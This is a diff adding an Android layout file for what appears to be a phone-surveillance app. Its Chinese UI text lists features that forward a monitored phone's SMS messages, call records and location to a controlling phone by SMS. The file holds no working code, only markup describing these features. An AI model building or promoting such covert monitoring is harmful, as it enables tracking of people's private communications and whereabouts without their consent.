@@ -1,0 +1,108 @@
+<?xml version="1.0" encoding="utf-8"?>
+<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
+    android:layout_width="match_parent"
+    android:layout_height="match_parent"
+    android:orientation="vertical" 
+    android:background="@drawable/main_bg"
+    >
+
+    <RelativeLayout
+        android:layout_width="fill_parent"
+        android:layout_height="fill_parent" >
+
+        <TextView
+            android:id="@+id/textView1"
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:layout_marginLeft="30dp"
+            android:layout_marginTop="50dp"
+            android:textColor="@color/white"
+            android:text="主控手机：" />
+
+        <TextView
+            android:id="@+id/textView2"
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:layout_alignLeft="@+id/textView1"
+            android:layout_marginRight="30dp"
+            android:layout_below="@+id/textView1"
+            android:textColor="@color/white"
+            android:text="主控者的手机，用于控制、监控被控者的手机" />
+
+        <TextView
+            android:id="@+id/textView3"
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:layout_marginLeft="30dp"
+            android:layout_marginRight="30dp"
+            android:layout_below="@+id/textView2"
+            android:layout_marginTop="30dp"
+            android:textColor="@color/white"
+            android:text="短信监控：" />
+
+        <TextView
+            android:id="@+id/textView4"
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:layout_marginLeft="30dp"
+            android:layout_marginRight="30dp"
+            android:layout_below="@+id/textView3" 
+            android:textColor="@color/white"           
+            android:text="监控被控手机收发的短信，将短信内容及发件人转发到主控手机" />
+
+        <TextView
+            android:id="@+id/textView5"
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:layout_marginLeft="30dp"
+            android:layout_marginRight="30dp"
+            android:layout_below="@+id/textView4"
+            android:layout_marginTop="30dp"
+            android:textColor="@color/white"
+            android:text="来电监控：" />
+
+        <TextView
+            android:id="@+id/textView6"
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:layout_marginLeft="30dp"
+            android:layout_marginRight="30dp"
+            android:layout_below="@+id/textView5"
+            android:textColor="@color/white"
+            android:text="监控被控手机的最新电话记录，将电话号码及通话信息发送到主控手机" />
+
+        <TextView
+            android:id="@+id/textView7"
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:layout_marginLeft="30dp"
+            android:layout_marginRight="30dp"
+            android:layout_below="@+id/textView6"
+            android:layout_marginTop="30dp"
+            android:textColor="@color/white"
+            android:text="位置监控：" />
+
+        <TextView
+            android:id="@+id/textView8"
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:layout_marginLeft="30dp"
+            android:layout_marginRight="30dp"
+            android:layout_below="@+id/textView7"  
+            android:textColor="@color/white"         
+            android:text="主控者通过相应指令获得被主控手机目前所在的地理位置，并将位置发送到主控手机" />
+
+        <TextView
+            android:id="@+id/textView9"
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:layout_marginLeft="30dp"
+            android:layout_marginRight="30dp"
+            android:layout_below="@+id/textView8"
+            android:layout_marginTop="30dp"
+            android:textColor="@color/white"
+            android:text="注意：以上功能主要以短信的形式将被控者信息发送到主控手机上" />
+
+    </RelativeLayout>
+
+</LinearLayout>
